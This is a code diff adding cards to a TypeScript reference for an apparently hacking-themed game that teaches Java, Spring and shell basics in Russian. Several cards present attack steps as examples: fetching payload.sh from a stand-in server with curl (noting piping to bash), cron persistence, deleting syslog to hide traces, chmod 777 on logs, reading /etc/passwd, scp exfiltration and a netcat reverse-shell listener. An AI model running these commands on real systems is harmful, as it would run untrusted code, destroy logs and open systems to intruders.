@@ -913,7 +913,255 @@ export const JAVA_REFERENCE: Record<string, JavaConcept> = {
       '-r: Рекурсивный поиск во всех поддиректориях.',
       '-i: Игнорирование регистра символов.',
       '-v: Инвертировать поиск (показать всё, что НЕ совпадает).',
-      'RegEx: Поддержка мощных регулярных выражений для поиска сложных паттернов.'
     ]
+  },
+  'script_cat': {
+    id: 'script_cat',
+    title: 'Команда cat',
+    concept: 'Concatenate & Read Files',
+    explanation: 'Чтение содержимого файла прямо в терминал без открытия редакторов. Удобно для быстрого анализа небольших конфигов и логов.',
+    example: 'cat /etc/passwd',
+    purpose: 'Извлечение исходного кода или украденных конфигурационных файлов врага.',
+    bullets: [
+      'Simple: Просто читает файл от начала до конца.',
+      '> Redirect: Часто используется вместе со знаком ">" для записи вывода в другой файл.',
+      'Pipe: Передача данных следующим утилитам, например cat file | grep "test".',
+      'Raw Data: Выводит данные "как есть", что полезно для эксплоитов.'
+    ]
+  },
+  'script_scp': {
+    id: 'script_scp',
+    title: 'Команда scp',
+    concept: 'Secure Copy',
+    explanation: 'Копирование файлов между хостами по зашифрованному протоколу SSH. Никто не перехватит данные в открытом виде.',
+    example: 'scp root@neon-city:/var/logs/sys.log ./local',
+    purpose: 'Финальный этап многих диверсионных миссий: эксфильтрация данных (Data Exfiltration).',
+    bullets: [
+      '-r: Рекурсивное копирование целых директорий.',
+      'SSH-Keys: Использует ключи для беспарольного доступа.',
+      'Security: Данные защищены тем же криптоалгоритмом, что и ваш SSH туннель.',
+      'Exfiltration: В игре означает успешное извлечение нужных корпоративных логов.'
+    ]
+  },
+  'script_wash_logs': {
+    id: 'script_wash_logs',
+    title: 'Скрытие следов (rm -rf)',
+    concept: 'Log Sanitization',
+    explanation: 'Удаление лог-файлов операционной системы, чтобы системный администратор (или защитный ICE) не обнаружил ваше присутствие.',
+    example: 'rm -rf /var/log/syslog',
+    purpose: 'Уменьшение уровня розыска или сброс "Внимания ИИ" в боевой системе.',
+    bullets: [
+      '-r: Рекурсивно (удалить саму папку и всё под ней).',
+      '-f: Принудительно (force), без лишних вопросов.',
+      'Stealth: В игре восстанавливает Integrity, скрывая вас от систем безопасности.',
+      'Danger: Одно неаккуратное удаление — и вы положите собственный модуль.'
+    ]
+  },
+  'script_sudo_fix': {
+    id: 'script_sudo_fix',
+    title: 'Команда sudo',
+    concept: 'Superuser Do',
+    explanation: 'Исполнение команды с наивысшими привилегиями администратора (root). Позволяет обходить системные ограничения.',
+    example: 'sudo chmod -R 777 /var/log',
+    purpose: 'Экстренное изменение настроек или прав доступа.',
+    bullets: ['Security: Оставляет жирный след в логах ядра.', 'Power: Дает полный доступ к системе.']
+  },
+  'script_auth': {
+    id: 'script_auth',
+    title: 'Скрипт Аутентификации',
+    concept: 'Identity Auth',
+    explanation: 'Мгновенный обход базовых экранов логина или подмена JWT-токенов сессии.',
+    example: 'auth_token="Bearer $HACKED_KEY"',
+    purpose: 'Вход в защищенные сектора без валидного логина.',
+    bullets: ['Spoofing: Имитация авторизованного клиента.']
+  },
+  'script_ssh': {
+    id: 'script_ssh',
+    title: 'Туннель SSH',
+    concept: 'Secure Shell',
+    explanation: 'Установка зашифрованного канала (туннеля) к удаленному узлу. Основа удаленного администрирования.',
+    example: 'ssh admin@10.0.0.1 -p 22',
+    purpose: 'Связь с сервером через защищенный протокол (обычно порт 22).',
+    bullets: ['Keys: Использует RSA/Ed25519 ключи для входа без пароля.']
+  },
+  'script_curl': {
+    id: 'script_curl',
+    title: 'Запрос cURL',
+    concept: 'Client URL',
+    explanation: 'Утилита для скачивания бинарников с удаленного сервера или отправки HTTP-запросов (REST).',
+    example: 'curl -O http://drop.server/payload.sh',
+    purpose: 'Создание первого моста для загрузки эксплойтов.',
+    bullets: ['Piping: Можно напрямую передать выхлоп в bash: curl ... | bash']
+  },
+  'script_chmod': {
+    id: 'script_chmod',
+    title: 'Модификатор chmod',
+    concept: 'Change Mode',
+    explanation: 'Изменение битовой маски прав доступа к файлу. Карточка позволяет сделать текстовый скрипт "исполняемым".',
+    example: 'chmod +x payload.sh',
+    purpose: 'Подготовка скрипта к запуску в операционной системе.',
+    bullets: ['+x: Добавляет Execute бит для пользователя.']
+  },
+  'script_cron': {
+    id: 'script_cron',
+    title: 'Демон crond',
+    concept: 'Cron Scheduler',
+    explanation: 'Планировщик задач. Взломщики используют крон для поддержания постоянного доступа (persistence), заставляя сервер регулярно запускать их скрипты.',
+    example: '* * * * * /tmp/payload.sh',
+    purpose: 'Закрепление в системе после взлома.',
+    bullets: ['Timing: 5 звездочек определяют частоту (раз в минуту, час, день и т.д.)']
+  },
+  'script_nc': {
+    id: 'script_nc',
+    title: 'Слушатель Netcat',
+    concept: 'Netcat (nc)',
+    explanation: 'Универсальный сетевой швейцарский нож. Поднимает "прослушку" порта для удаленного бэкдора (reverse shell).',
+    example: 'nc -lvnp 4444',
+    purpose: 'Прием входящих сырых подключений с атакованных узлов.',
+    bullets: ['Reverse Shell: Позволяет получить удаленный терминал к жертве.']
+  },
+  'soft_ai_ask': {
+    id: 'soft_ai_ask',
+    title: 'Запрос к ИИ',
+    concept: 'LLM Prompt',
+    explanation: 'Использование нейросетевых ассистентов (вроде Copilot) для решения технической рутины.',
+    example: '// Prompt: Generate boilerplate CRUD',
+    purpose: 'Ускорение разработки шаблонов ценой возможных галлюцинаций ИИ.',
+    bullets: ['Warning: Может генерировать баги (Hallucinations).']
+  },
+  'infra_old_hw': {
+    id: 'infra_old_hw',
+    title: 'Списанное железо',
+    concept: 'Legacy Hardware',
+    explanation: 'Дешевое, шумное и горячее оборудование с рынка Серых Деталей. Добавляет слоты ОЗУ, но сильно греется.',
+    example: 'Intel Core 2 Duo (Overclocked)',
+    purpose: 'Расширение базовых слотов для нищих студентов.',
+    bullets: ['Penalty: Вызывает Стресс у оператора.']
+  },
+  'lib_lombok_data': {
+    id: 'lib_lombok_data',
+    title: 'Аннотация @Data',
+    concept: 'Lombok',
+    explanation: 'Синтетический сахар, автоматически генерирующий геттеры, сеттеры и toString на этапе компиляции.',
+    example: '@Data\npublic class User {}',
+    purpose: 'Уменьшение Boilerplate-кода.',
+    bullets: ['Plugin: Требует настройки плагинов IDE.']
+  },
+  'lib_lombok_builder': {
+    id: 'lib_lombok_builder',
+    title: 'Аннотация @Builder',
+    concept: 'Lombok Builder Pattern',
+    explanation: 'Генерирует Fluent API (паттерн Строитель) для мгновенного и читаемого создания объектов.',
+    example: 'User.builder().name("Z").build();',
+    purpose: 'Создание иммутабельных (неизменяемых) DTO объектов.',
+    bullets: ['Immutability: Отлично работает вместе с final полями.']
+  },
+  'lib_commons_blank': {
+    id: 'lib_commons_blank',
+    title: 'Утилита isBlank',
+    concept: 'Apache Commons Lang',
+    explanation: 'Метод, который проверяет строку на null, пустоту и наличие только пробелов.',
+    example: 'StringUtils.isBlank("   "); // true',
+    purpose: 'Коробочная валидация строкового ввода.',
+    bullets: ['Safety: Избавляет от громоздких проверок a == null || a.trim().isEmpty()']
+  },
+  'mid_stream_filter': {
+    id: 'mid_stream_filter',
+    title: 'Stream .filter()',
+    concept: 'Stream API',
+    explanation: 'Функция промежуточной обработки коллекции, пропускающая только те элементы, которые соответствуют условию (предикату).',
+    example: 'list.stream().filter(u -> u.isActive())',
+    purpose: 'Декларативная фильтрация данных.',
+    bullets: ['Predicate: Принимает интерфейс Predicate<T>.']
+  },
+  'mid_stream_collect': {
+    id: 'mid_stream_collect',
+    title: 'Stream .collect()',
+    concept: 'Stream API',
+    explanation: 'Терминальная операция, которая сворачивает (схлопывает) отфильтрованный поток абстракций обратно в реальную коллекцию.',
+    example: '.collect(Collectors.toList());',
+    purpose: 'Завершение цепочки Stream и фиксация результата.',
+    bullets: ['Terminal: После этой операции Stream закрывается и уничтожается.']
+  },
+  'lib_spring_repo': {
+    id: 'lib_spring_repo',
+    title: 'Spring Repository',
+    concept: 'Spring Data JPA',
+    explanation: 'Магический интерфейс, который автоматически генерирует SQL-запросы в БД на основе имен методов.',
+    example: 'interface UserRepo extends JpaRepository<User, String> {}',
+    purpose: 'Подключение к базам данных без написания SQL кода.',
+    bullets: ['Proxy: Spring создает реализацию на лету (в рантайме).']
+  },
+  'infra_k8s_cluster': {
+    id: 'infra_k8s_cluster',
+    title: 'Среда Kubernetes (K8s)',
+    concept: 'Container Orchestration',
+    explanation: 'Мультиузловая распределенная система, которая автоматически подымает упавшие контейнеры и перераспределяет нагрузку.',
+    example: 'kubectl scale deployment --replicas=3',
+    purpose: 'Высокая доступность (High Availability) и балансировка серверов.',
+    bullets: ['Self-Healing: Блокирует практически любой урон от системных багов.']
+  },
+  'infra_cdn_edge': {
+    id: 'infra_cdn_edge',
+    title: 'Узел CDN',
+    concept: 'Content Delivery Network',
+    explanation: 'Глобальная сеть кэширующих серверов (Edge). Отдает контент юзерам из ближайшей географической точки.',
+    example: 'Cloudflare / AWS CloudFront',
+    purpose: 'Снижение нагрузки на главный сервер и ускорение статики (картинок).',
+    bullets: ['Cache: Данные могут быть не самыми свежими (Stale).']
+  },
+  'infra_log_aggregator': {
+    id: 'infra_log_aggregator',
+    title: 'Агрегатор логов',
+    concept: 'ELK / Splunk',
+    explanation: 'Сбор логов со всех серверов кластера в единое хранилище (ElasticSearch) с возможностью быстрого поиска.',
+    example: 'Kibana Dashboard',
+    purpose: 'Ускорение поиска ошибок и уязвимостей в живой системе.',
+    bullets: ['Discovery: Автоматически снимает "Защитный лед" у багов в игре.']
+  },
+  'infra_vpc_network': {
+    id: 'infra_vpc_network',
+    title: 'Изолированный VPC',
+    concept: 'Virtual Private Cloud',
+    explanation: 'Создание скрытой подсети в публичном облаке, недоступной напрямую из интернета.',
+    example: 'Private Subnet 10.0.1.0/24',
+    purpose: 'Защита баз данных и внутренних микросервисов портами.',
+    bullets: ['Bastion: Требует выделенного шлюза (Jump Host) для доступа извне.']
+  },
+  'infra_db_cluster': {
+    id: 'infra_db_cluster',
+    title: 'Кластер Баз Данных',
+    concept: 'Replication DB',
+    explanation: 'Установка master-базы для записи и нескольких replica-баз для чтения, спасающих от потери данных при падении.',
+    example: 'PostgreSQL HA Cluster',
+    purpose: 'Защита от отказа узла (Single Point of Failure).',
+    bullets: ['Durability: Обеспечивает отказоустойчивость хранения.']
+  },
+  'soft_throw_ex': {
+    id: 'soft_throw_ex',
+    title: 'Выбросить исключение',
+    concept: 'Throw Exception',
+    explanation: 'Принудительное создание аварийной ситуации. Заставляет программу немедленно прервать текущий поток выполнения и передать управление блоку catch.',
+    example: 'throw new IllegalStateException("Hacked!");',
+    purpose: 'Сигнализация о критической ошибке, которую невозможно обработать здесь.',
+    bullets: ['Unwind: Раскручивает стек вызовов, уничтожая локальные переменные.']
+  },
+  'soft_finally': {
+    id: 'soft_finally',
+    title: 'Блок Finally',
+    concept: 'Finally Block',
+    explanation: 'Блок кода, который выполняется ГАРАНТИРОВАННО (в 99.9% случаев), независимо от того, произошла ошибка в методе или нет.',
+    example: 'finally { socket.close(); }',
+    purpose: 'Очистка ресурсов (закрытие файлов, сокетов, подключений к БД).',
+    bullets: ['Execution: Не срабатывает только при System.exit() или физической смерти ядра.']
+  },
+  'reward_divine_debug': {
+    id: 'reward_divine_debug',
+    title: 'Божественный Дебаггер',
+    concept: 'Divine Interception',
+    explanation: 'Секретная утилита Ядра. Умеет откатывать стейт JVM во времени (Time-Travel Debugging), замораживая процесс вопреки законам энтропии.',
+    example: 'Ctrl+Z для самой реальности.',
+    purpose: 'Восстановление после критических атак.',
+    bullets: ['Legendary: Доступно только высшим Архитекторам Ядра.']
   }
 };
